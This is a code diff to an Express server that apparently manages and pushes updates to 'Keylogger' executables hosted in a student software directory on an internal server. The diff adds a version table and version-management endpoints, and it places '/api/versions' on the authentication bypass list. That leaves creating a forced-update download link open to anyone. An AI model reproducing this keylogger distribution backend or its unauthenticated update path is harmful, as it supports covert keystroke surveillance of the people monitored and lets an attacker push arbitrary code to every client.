@@ -261,7 +261,7 @@ const asyncHandler = fn => (req, res, next) => {
 
 // ========== 认证中间件 ==========
 function authMiddleware(req, res, next) {
-    const allowedPaths = ['/login', '/login.html', '/api/login', '/api/update/check'];
+    const allowedPaths = ['/login', '/login.html', '/api/login', '/api/update/check', '/api/versions', '/api/versions/'];
     // 允许静态资源（CSS/JS）通过，否则登录页样式丢失
     if (allowedPaths.includes(req.path) || req.path.startsWith('/css') || req.path.startsWith('/js') || req.path.startsWith('/assets')) {
         return next();
@@ -663,6 +663,18 @@ async function initDatabase() {
                 password_hash CHAR(64) NOT NULL UNIQUE,
                 password TEXT NOT NULL,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+        `);
+
+        await executeWithRetry(`
+            CREATE TABLE IF NOT EXISTS client_versions (
+                id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+                version VARCHAR(20) NOT NULL UNIQUE COMMENT '版本号，如 1.0.1',
+                download_url TEXT NOT NULL COMMENT '下载链接',
+                is_active BOOLEAN DEFAULT FALSE COMMENT '是否为当前激活版本',
+                force_update BOOLEAN DEFAULT FALSE COMMENT '是否强制更新',
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
             ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
         `);
 
@@ -1338,138 +1350,44 @@ app.get('/api/clients', (req, res) => {
 
 app.get('/api/update/check', asyncHandler(async (req, res) => {
     try {
-        logger.info('开始检查更新...');
+        // 首先检查数据库中是否有激活的版本
+        const activeVersionRows = await executeWithRetry(
+            'SELECT version, download_url, force_update FROM client_versions WHERE is_active = TRUE LIMIT 1'
+        );
         
-        // 只检查用户指定的目录
-        const possibleDirs = [
-            '/学生目录/软件/键盘记录器'
-        ];
-        
-        let latestVersion = '1.0.1';
-        let downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/Keylogger_v${latestVersion}.exe`;
-        
-        try {
-            // 先检查 Alist 登录状态
-            await alistClient._ensureToken();
-            logger.info('Alist 登录状态正常');
-            logger.info(`Alist 服务器: ${CONFIG.alist.url}`);
-            
-            let foundFiles = [];
-            
-            // 检查每个可能的目录
-            for (const dir of possibleDirs) {
-                try {
-                    logger.info(`检查目录: ${dir}`);
-                    const files = await alistClient.listFiles(dir);
-                    logger.info(`目录 ${dir} 中有 ${files.length} 个文件`);
-                    
-                    if (files.length > 0) {
-                        logger.info(`目录 ${dir} 中的文件:`);
-                        files.forEach((file, index) => {
-                            logger.info(`  ${index + 1}. ${file.filename} (${file.size} bytes)`);
-                        });
-                        foundFiles = foundFiles.concat(files);
-                    } else {
-                        logger.info(`目录 ${dir} 为空`);
-                    }
-                } catch (error) {
-                    logger.error(`检查目录 ${dir} 失败`, { error: error.message, stack: error.stack });
-                }
-            }
-            
-            // 过滤出 Keylogger 可执行文件并解析版本号
-            const keyloggerFiles = foundFiles.filter(file => {
-                const match = file.filename.match(/^Keylogger(_v(\d+\.\d+\.\d+))?\.exe$/i);
-                if (match) {
-                    const version = match[2] || '1.0.0';
-                    logger.info(`找到 Keylogger 文件: ${file.filename}, 版本: ${version}`);
-                }
-                return match;
+        if (activeVersionRows.length > 0) {
+            const activeVersion = activeVersionRows[0];
+            logger.info(`返回数据库激活版本: ${activeVersion.version}`);
+            return res.json({ 
+                code: 200, 
+                data: { 
+                    version: activeVersion.version, 
+                    download_url: activeVersion.download_url,
+                    force_update: activeVersion.force_update
+                } 
             });
-            
-            if (keyloggerFiles.length > 0) {
-                // 比较版本号，找出最新版本
-                let tempLatestVersion = '0.0.0';
-                let latestFilename = '';
-                let latestDir = '';
-                
-                for (const file of keyloggerFiles) {
-                    const match = file.filename.match(/^Keylogger(_v(\d+\.\d+\.\d+))?\.exe$/i);
-                    if (match) {
-                        const version = match[2] || '1.0.0';
-                        if (compareVersions(version, tempLatestVersion) > 0) {
-                            tempLatestVersion = version;
-                            latestFilename = file.filename;
-                        }
-                    }
-                }
-                
-                // 找到最新版本后，确定其所在目录
-                if (latestFilename) {
-                    for (const dir of possibleDirs) {
-                        try {
-                            const dirFiles = await alistClient.listFiles(dir);
-                            if (dirFiles.some(f => f.filename === latestFilename)) {
-                                latestDir = dir;
-                                break;
-                            }
-                        } catch (error) {
-                            // 忽略错误
-                        }
-                    }
-                }
-                
-                if (tempLatestVersion !== '0.0.0' && latestDir) {
-                    latestVersion = tempLatestVersion;
-                    // 构建完整文件路径
-                    const filePath = `${latestDir}/${latestFilename}`;
-                    try {
-                        // 获取文件的原始下载链接
-                        const fileInfo = await alistClient._request('GET', `/api/fs/get?path=${encodeURIComponent(filePath)}`);
-                        if (fileInfo.code === 200 && fileInfo.data && fileInfo.data.raw_url) {
-                            downloadUrl = fileInfo.data.raw_url;
-                            logger.info(`找到最新版本: ${latestVersion}, 文件名: ${latestFilename}, 直接下载链接: ${downloadUrl}`);
-                        } else {
-                            // 如果获取raw_url失败，使用默认构造的链接
-                            downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/${encodeURIComponent(latestFilename)}`;
-                            logger.warn(`获取raw_url失败，使用默认链接: ${downloadUrl}`);
-                        }
-                    } catch (error) {
-                        // 如果获取raw_url失败，使用默认构造的链接
-                        downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/${encodeURIComponent(latestFilename)}`;
-                        logger.warn(`获取raw_url失败: ${error.message}, 使用默认链接: ${downloadUrl}`);
-                    }
-                }
-            } else {
-                logger.info('未找到 Keylogger 可执行文件');
-                // 尝试直接使用用户提到的路径
-                logger.info('尝试使用用户提到的路径作为下载链接');
-            }
-        } catch (error) {
-            logger.error('检查 Alist 版本失败，使用默认版本', { error: error.message, stack: error.stack });
         }
         
-        logger.info(`返回版本: ${latestVersion}, 下载链接: ${downloadUrl}`);
-        
-        res.json({ 
-            code: 200, 
-            data: { 
-                version: latestVersion, 
-                download_url: downloadUrl 
-            } 
+        // 数据库中没有激活版本，返回空版本（通知客户端无需更新）
+        logger.info('数据库中没有激活版本，返回空版本');
+        return res.json({
+            code: 200,
+            data: {
+                version: '',
+                download_url: '',
+                force_update: false
+            }
         });
         
     } catch (error) {
         logger.error('检查更新失败', { error: error.message, stack: error.stack });
-        // 即使发生错误，也要返回默认版本
-        const defaultVersion = '1.0.1';
-        const downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/Keylogger_v${defaultVersion}.exe`;
-        res.json({ 
-            code: 200, 
-            data: { 
-                version: defaultVersion, 
-                download_url: downloadUrl 
-            } 
+        return res.json({
+            code: 200,
+            data: {
+                version: '',
+                download_url: '',
+                force_update: false
+            }
         });
     }
 }));
@@ -2084,6 +2002,71 @@ app.get('/api/blacklist', asyncHandler(async (req, res) => {
         [limit, offset]
     );
     res.json({ success: true, blacklist: rows, total, page, limit, totalPages });
+}));
+
+// ========== 版本管理 API ==========
+
+// 获取所有可用版本
+app.get('/api/versions', asyncHandler(async (req, res) => {
+    const rows = await executeWithRetry(
+        'SELECT id, version, download_url, is_active, force_update, created_at, updated_at FROM client_versions ORDER BY version DESC'
+    );
+    res.json({ success: true, versions: rows });
+}));
+
+// 添加新版本
+app.post('/api/versions', asyncHandler(async (req, res) => {
+    const { version, download_url, is_active, force_update } = req.body;
+    
+    if (!version || !download_url) {
+        return res.status(400).json({ error: '版本号和下载链接不能为空' });
+    }
+    
+    // 如果设置为激活状态，先取消其他版本的激活状态
+    if (is_active) {
+        await executeWithRetry('UPDATE client_versions SET is_active = FALSE WHERE is_active = TRUE');
+    }
+    
+    await executeWithRetry(
+        'INSERT INTO client_versions (version, download_url, is_active, force_update) VALUES (?, ?, ?, ?)',
+        [version, download_url, is_active || false, force_update || false]
+    );
+    
+    logger.info(`添加新版本: ${version}`, { user: req.user || 'unknown' });
+    res.json({ success: true, message: '版本添加成功' });
+}));
+
+// 更新版本设置
+app.put('/api/versions/:id', asyncHandler(async (req, res) => {
+    const { id } = req.params;
+    const { version, download_url, is_active, force_update } = req.body;
+    
+    if (!version || !download_url) {
+        return res.status(400).json({ error: '版本号和下载链接不能为空' });
+    }
+    
+    // 如果设置为激活状态，先取消其他版本的激活状态
+    if (is_active) {
+        await executeWithRetry('UPDATE client_versions SET is_active = FALSE WHERE is_active = TRUE AND id != ?', [id]);
+    }
+    
+    await executeWithRetry(
+        'UPDATE client_versions SET version = ?, download_url = ?, is_active = ?, force_update = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
+        [version, download_url, is_active || false, force_update || false, id]
+    );
+    
+    logger.info(`更新版本: ${version}`, { user: req.user || 'unknown' });
+    res.json({ success: true, message: '版本更新成功' });
+}));
+
+// 删除版本
+app.delete('/api/versions/:id', asyncHandler(async (req, res) => {
+    const { id } = req.params;
+    
+    await executeWithRetry('DELETE FROM client_versions WHERE id = ?', [id]);
+    
+    logger.info(`删除版本 ID: ${id}`, { user: req.user || 'unknown' });
+    res.json({ success: true, message: '版本删除成功' });
 }));
 
 app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
